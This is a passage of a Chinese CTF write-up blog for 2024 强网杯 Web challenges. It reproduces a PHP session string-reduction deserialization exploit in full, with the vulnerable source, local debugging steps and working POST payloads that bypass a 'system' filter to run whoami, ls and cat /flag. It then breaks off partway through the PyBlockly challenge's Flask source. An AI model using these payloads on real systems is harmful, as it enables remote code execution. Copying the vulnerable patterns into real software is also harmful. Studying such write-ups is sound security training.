class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;任何人都可以登录的平台&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">            background-color: #f0f4f8;</span><br><span class="line">            font-family: Arial, sans-serif;</span><br><span class="line">            display: flex;</span><br><span class="line">            flex-direction: column;</span><br><span class="line">            align-items: center;</span><br><span class="line">            justify-content: center;</span><br><span class="line">            height: 100vh;</span><br><span class="line">            margin: 0;</span><br><span class="line">            text-align: center;</span><br><span class="line">        &#125;</span><br><span class="line">        h1 &#123;</span><br><span class="line">            color: #333;</span><br><span class="line">            margin-bottom: 20px;</span><br><span class="line">        &#125;</span><br><span class="line">        p &#123;</span><br><span class="line">            color: #555;</span><br><span class="line">            font-size: 18px;</span><br><span class="line">            margin: 0;</span><br><span class="line">        &#125;</span><br><span class="line">        .session-info &#123;</span><br><span class="line">            background-color: #fff;</span><br><span class="line">            border-radius: 10px;</span><br><span class="line">            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);</span><br><span class="line">            padding: 20px;</span><br><span class="line">            width: 300px;</span><br><span class="line">            margin-top: 20px;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;欢迎来到任何人都可以登录的平台&lt;/h1&gt;</span><br><span class="line">    &lt;div class=&quot;session-info&quot;&gt;</span><br><span class="line">        &lt;p&gt;你好，&lt;?php echo htmlspecialchars($_SESSION[&#x27;user&#x27;]); ?&gt;！&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>user.php</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class User &#123;</span><br><span class="line">    private $validUser = [</span><br><span class="line">        &#x27;username&#x27; =&gt; &#x27;admin&#x27;,</span><br><span class="line">        &#x27;password&#x27; =&gt; &#x27;password&#x27;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    public function authenticate($username, $password) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241105200845953.png" class title="image-20241105200845953">
+
+<p>随意登录</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241105200856834.png" class title="image-20241105200856834">
+
+<p>搭建 <code>docker</code> 进行本地调试</p>
+<p><strong>首先对解题思路进行分析</strong></p>
+<p>当访问 <code>index.php</code> 时，会将多个信息存入 <code>session</code> 中，根据 <code>php</code> 中<code>session</code> 的机制，这些信息会存储在本地文件内</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//index.php</span><br><span class="line">if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27;) &#123;</span><br><span class="line">    $username = $_POST[&#x27;username&#x27;];</span><br><span class="line">    $password = $_POST[&#x27;password&#x27;];</span><br><span class="line"></span><br><span class="line">    $_SESSION[&#x27;user&#x27;] = $username;</span><br><span class="line"></span><br><span class="line">    if (!isset($_SESSION[&#x27;session_key&#x27;])) &#123;</span><br><span class="line">        $_SESSION[&#x27;session_key&#x27;] =$SessionRandom -&gt; generateRandomString();</span><br><span class="line">    &#125;</span><br><span class="line">    $_SESSION[&#x27;password&#x27;] = $password;</span><br></pre></td></tr></table></figure></div>
+
+<p><code>$SessionRandom -&gt; generateRandomString()</code> 的作用，是调用 <code>class.php</code> 中 <code>SessionRandom</code> 的 <code>generateRandomString()</code> 函数，这个函数会按照给定的字符生成一个一些随机值并返回</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class SessionRandom &#123;</span><br><span class="line">    public function generateRandomString() &#123;</span><br><span class="line">    $length = rand(1, 50);</span><br><span class="line"></span><br><span class="line">    $characters = &#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;;</span><br><span class="line">    $charactersLength = strlen($characters);</span><br><span class="line">    $randomString = &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">    for ($i = 0; $i &lt; $length; $i++) &#123;</span><br><span class="line">        $randomString .= $characters[rand(0, $charactersLength - 1)];</span><br><span class="line">    &#125;</span><br><span class="line">    return $randomString;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>当直接访问 <code>index.php</code> ，不输入账号密码时</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241105202017717.png" class title="image-20241105202017717">
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241105202050883.png" class title="image-20241105202050883">
+
+<p>当输入账号密码时，可以看到信息都被存入 <code>session</code> 文件中</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin/admin</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241105202157274.png" class title="image-20241105202157274">
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241105202346170.png" class title="image-20241105202346170">
+
+<p>然后看 <code>class.php</code> ，这个文件内容是关于一些自定义函数和魔术方法，当访问 <code>index.php</code> ，就会触发 <code>class.php</code> 的 <code>SessionMaganer-&gt;filterSesnsitiveFunctions()</code> </p>
+<p>关键点在这里，会对 <code>session</code> 文件内容进行替换，假如匹配到指定字符串则替换为空，存在<strong>字符串溢出减少漏洞</strong> </p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">private $sensitiveFunctions = [&#x27;system&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;passthru&#x27;, &#x27;shell_exec&#x27;, &#x27;popen&#x27;, &#x27;proc_open&#x27;];</span><br><span class="line">....</span><br><span class="line">foreach ($this-&gt;sensitiveFunctions as $function) &#123;</span><br><span class="line">                if (strpos($sessionData, $function) !== false) &#123;</span><br><span class="line">                    $sessionData = str_replace($function, &#x27;&#x27;, $sessionData);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>继续看 <code>class.php</code> ，<code>notouchitsclass</code> 对象中存在 <code>eval()</code> 函数，当反序列化时会触发，结合前面的 <code>session</code> 内容写入，可以总结出生成序列化字符串写入 <code>session</code> 中，然后反序列化的思路</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class notouchitsclass &#123;</span><br><span class="line">    public $data;</span><br><span class="line">    public function __construct($data) &#123;</span><br><span class="line">        $this-&gt;data = $data;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        eval($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>接下来就是找到反序列化的点，哪里会将程序进行反序列化：</p>
+<p>在 <code>dashboard.php</code> 存在中 <code>session_start()</code> 函数，要读取 <code>session</code> 文件，就得在读取时进行反序列化</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">...</span><br><span class="line">session_start();</span><br><span class="line">...</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>在本地继续测试，输入 <code>admin/system</code> ，按照源码，<code>system</code> 本应该会被替换为空，但是看到本地实际上 <code>session</code> 文件中 <code>password</code> 仍然为 <code>system</code>  </p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241105210402393.png" class title="image-20241105210402393">
+
+<p>修改程序进一步调试</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241105212708611.png" class>
+
+<p>再次发包，看到 <code>sessionFile</code> 得到的值为 <code>/sess_abc</code> ，而本地内部默认存储的是 <code>/tmp/sess_xx</code> 路径，因此本地的程序并不像理论上的进行运行</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241105212803227.png" class title="image-20241105212803227">
+
+<p>找到问题，给 <code>$sessionPath</code> 赋值上 <code>/tmp</code> 即可 </p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241105213302484.png" class title="image-20241105213302484">
+
+<p>再次发包，本地的 <code>system</code> 被正确替换了</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241105213756379.png" class title="image-20241105213756379">
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241105213835905.png" class title="image-20241105213835905">
+
+<p>这里字符串溢出就很明显，字符被替换为空，但前面的数字不变</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:6:&quot;&quot;;</span><br></pre></td></tr></table></figure></div>
+
+<p>在正式进行字符串溢出漏洞利用之前，先做一步确认 <code>dashboard.php</code> 会触发反序列化</p>
+<p>准备要序列化的内容，当反序列化时，就会触发 <code>class.php</code> 的 <code>notouchitsclass.__destruct()</code> 的魔术方法  </p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class notouchitsclass &#123;</span><br><span class="line">    public $data = &quot;system(&#x27;echo OK &gt; /tmp/OK&#x27;);&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a = new notouchitsclass();</span><br><span class="line">echo serialize($a);</span><br><span class="line">//O:15:&quot;notouchitsclass&quot;:1:&#123;s:4:&quot;data&quot;;s:28:&quot;system(&#x27;echo OK &gt; /tmp/OK&#x27;);&quot;;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>直接本地将 session 内容修改</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user|O:15:&quot;notouchitsclass&quot;:1:&#123;s:4:&quot;data&quot;;s:28:&quot;system(&#x27;echo OK &gt; /tmp/OK&#x27;);&quot;;&#125;......</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241106100552865.png" class title="image-20241106100552865">
+
+<p>访问 <code>dashboard.php</code> ，提示权限不够</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241106100719371.png" class title="image-20241106100719371">
+
+<p>本地 <code>docker</code> 的默认用户是 <code>root</code> ，修改之后，它默认权限也变为了 <code>root</code> ，将 <code>session</code> 文件权限降级</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown www-data:www-data /tmp/sess_abc</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241106102907096.png" class title="image-20241106102907096">
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241106105740938.png" class title="image-20241106105740938">
+
+<p>访问 <code>/dashboard.php</code> ，本地生成了 <code>/tmp/OK</code> ，说明反序列化确实执行了<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241106105824027.png" class title="image-20241106105824027"></p>
+<p>接下来就是 <strong>字符串溢出减少的利用</strong> </p>
+<p>溢出减少的条件之一：两个相连可控参数，利用传参数组创造这个条件</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241106110423045.png" class title="image-20241106110423045">
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241106110457517.png" class title="image-20241106110457517">
+
+<p>字符串溢出当有源码时可以本地调试时，构造技巧，可以直接让源码打印出替换后的值，然后改一次发一次，取出来再微调。</p>
+<p>构造初步 Payload</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password[]=systemsystem&amp;password[]=&quot;;i:1;O:15:&quot;notouchitsclass&quot;:1:&#123;s:4:&quot;data&quot;;s:17:&quot;system(&#x27;whoami&#x27;);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>发现当传入之后，这里的 <code>system</code> 被替换为空了</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241106112720360.png" class title="image-20241106112720360">
+
+<p>补上双写(双写的同时不能修改前面的数值，因为双写后有一个 <code>system</code> 会被替换为空)</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password[]=systemsystem&amp;password[]=&quot;;i:1;O:15:&quot;notouchitsclass&quot;:1:&#123;s:4:&quot;data&quot;;s:17:&quot;syssystemtem(&#x27;whoami&#x27;);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>多次请求，将 <code>session</code> 写入，然后请求 <code>dashboard.php</code> ，本地测试成功</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241106113631325.png" class title="image-20241106113631325">
+
+<p>接下来打远程 !</p>
+<p>发包时会返回 302 重定向，跳转到 <code>dashboard.php</code> ，不管它，多发几次，将内容写入 <code>session</code></p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241106114358764.png" class title="image-20241106114358764">
+
+<p>然后访问 <code>dashboard.php</code> ，成功执行 <code>whoami</code></p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241106114350366.png" class title="image-20241106114350366">
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password[]=systemsystem&amp;password[]=&quot;;i:1;O:15:&quot;notouchitsclass&quot;:1:&#123;s:4:&quot;data&quot;;s:15:&quot;syssystemtem(&#x27;ls /&#x27;);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241106114752216.png" class title="image-20241106114752216">
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password[]=systemsystem&amp;password[]=&quot;;i:1;O:15:&quot;notouchitsclass&quot;:1:&#123;s:4:&quot;data&quot;;s:20:&quot;syssystemtem(&#x27;cat /flag&#x27;);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241106114906494.png" class title="image-20241106114906494">
+
+
+
+
+
+<h2 id="2024-强网杯-PyBlockly"><a href="#2024-强网杯-PyBlockly" class="headerlink" title="[2024 强网杯]PyBlockly"></a>[2024 强网杯]PyBlockly</h2><p><strong>考点：len 函数重定义与命令注入、字符编码绕过、SUID 提权</strong> </p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241107161833137.png" class title="image-20241107161833137">
+
+<p>根目录服务为 JS Blockly 积木块，当拼接积木然后 <code>send</code> 发送时，会发送一个 JSON 数据，如发送 <code>1111</code> </p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241107162007550.png" class title="image-20241107162007550">
+
+<p>​                                                                                                返回了<img lazyload src="/images/loading.svg" data-src="/2025/03/05/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E5%A4%8D%E7%8E%B0/image-20241107162020328.png" class title="image-20241107162020328"></p>
+<p><strong>源码如下：</strong></p>
+<p>app.py  &#x2F;&#x2F; Flask Web服务核心源码</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request, jsonify</span><br><span class="line">import re</span><br><span class="line">import unidecode</span><br><span class="line">import string</span><br><span class="line">import ast</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">import subprocess</span><br><span class="line">import importlib.util</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[&#x27;JSON_AS_ASCII&#x27;] = False</span><br><span class="line"></span><br><span class="line">blacklist_pattern = r&quot;[!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\\]^_`&#123;|&#125;~]&quot;</span><br><span class="line"></span><br><span class="line">def module_exists(module_name):</span><br><span class="line"></span><br><span class="line">    spec = importlib.util.find_spec(module_name)</span><br><span class="line">    if spec is None:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    if module_name in sys.builtin_module_names:</span><br><span class="line">        return True</span><br><span class="line">    </span><br><span class="line">    if spec.origin:</span><br><span class="line">        std_lib_path = os.path.dirname(os.__file__)</span><br><span class="line">        </span><br><span class="line">        if spec.origin.startswith(std_lib_path) and not spec.origin.startswith(os.getcwd()):</span><br><span class="line">            return True</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line">def verify_secure(m):</span><br><span class="line">    for node in ast.walk(m):</span><br><span class="line">        match type(node):</span><br><span class="line">            case ast.Import:  </span><br><span class="line">                print(&quot;ERROR: Banned module &quot;)</span><br><span class="line">                return False</span><br><span class="line">            case ast.ImportFrom: </span><br><span class="line">                print(f&quot;ERROR: Banned module &#123;node.module&#125;&quot;)</span><br><span class="line">                return False</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">def check_for_blacklisted_symbols(input_text):</span><br><span class="line">    if re.search(blacklist_pattern, input_text):</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def block_to_python(block):</span><br><span class="line">    block_type = block[&#x27;type&#x27;]</span><br><span class="line">    code = &#x27;&#x27;</span><br><span class="line">    </span><br><span class="line">    if block_type == &#x27;print&#x27;:</span><br><span class="line">        text_block = block[&#x27;inputs&#x27;][&#x27;TEXT&#x27;][&#x27;block&#x27;]</span><br><span class="line">        text = block_to_python(text_block)</span><br><span class="line">        code = f&quot;print(&#123;text&#125;)&quot;</span><br><span class="line">           </span><br><span class="line">    elif block_type == &#x27;math_number&#x27;:</span><br><span class="line">        </span><br><span class="line">        if str(block[&#x27;fields&#x27;][&#x27;NUM&#x27;]).isdigit():      </span><br><span class="line">            code =  int(block[&#x27;fields&#x27;][&#x27;NUM&#x27;]) </span><br><span class="line">        else:</span><br><span class="line">            code = &#x27;&#x27;</span><br><span class="line">    elif block_type == &#x27;text&#x27;:</span><br><span class="line">        if check_for_blacklisted_symbols(block[&#x27;fields&#x27;][&#x27;TEXT&#x27;]):</span><br><span class="line">            code = &#x27;&#x27;</span><br><span class="line">        else:</span><br><span class="line">        </span><br><span class="line">            code =  &quot;&#x27;&quot; + unidecode.unidecode(block[&#x27;fields&#x27;][&#x27;TEXT&#x27;]) + &quot;&#x27;&quot;</span><br><span class="line">    elif block_type == &#x27;max&#x27;:</span><br><span class="line">        </span><br><span class="line">        a_block = block[&#x27;inputs&#x27;][&#x27;A&#x27;][&#x27;block&#x27;]</span><br><span class="line">        b_block = block[&#x27;inputs&#x27;][&#x27;B&#x27;][&#x27;block&#x27;]</span><br><span class="line">        a = block_to_python(a_block)  </span><br><span class="line">        b = block_to_python(b_block)</span><br><span class="line">        code =  f&quot;max(&#123;a&#125;, &#123;b&#125;)&quot;</span><br><span class="line"></span><br><span class="line">    elif block_type == &#x27;min&#x27;:</span><br><span class="line">        a_block = block[&#x27;inputs&#x27;][&#x27;A&#x27;][&#x27;block&#x27;]</span><br><span class="line">        b_block = block[&#x27;inputs&#x27;][&#x27;B&#x27;][&#x27;block&#x27;]</span><br><span class="line">        a = block_to_python(a_block)</span><br><span class="line">        b = block_to_python(b_block)</span><br><span class="line">        code =  f&quot;min(&#123;a&#125;, &#123;b&#125;)&quot;</span><br><span class="line"></span><br><span class="line">    if &#x27;next&#x27; in block:</span><br><span class="line">        </span><br><span class="line">        block = block[&#x27;next&#x27;][&#x27;block&#x27;]</span><br><span class="line">        </span><br><span class="line">        code +=&quot;\n&quot; + block_to_python(block)+ &quot;\n&quot;</span><br><span class="line">    else:</span><br><span class="line">        return code </span><br><span class="line">    return code</span><br><span class="line"></span><br><span class="line">def json_to_python(blockly_data):</span><br><span class="line">    block = blockly_data[&#x27;blocks&#x27;][&#x27;blocks&#x27;][0]</span><br><span class="line"></span><br><span class="line">    python_code = 